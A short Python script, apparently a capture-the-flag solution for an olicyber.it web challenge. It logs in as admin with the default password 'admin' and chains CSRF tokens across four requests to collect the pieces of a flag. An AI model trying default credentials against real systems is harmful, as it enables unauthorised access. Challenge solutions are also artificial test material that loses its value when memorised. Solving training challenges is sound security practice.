import requests

s = requests.Session()
r = s.post("http://web-11.challs.olicyber.it/login", json={"username":"admin","password":"admin"})

for i in range(4):
    r = s.get(f'http://web-11.challs.olicyber.it/flag_piece?csrf={r.json()["csrf"]}&index={i}')
    print(r.json()["flag_piece"], end='')
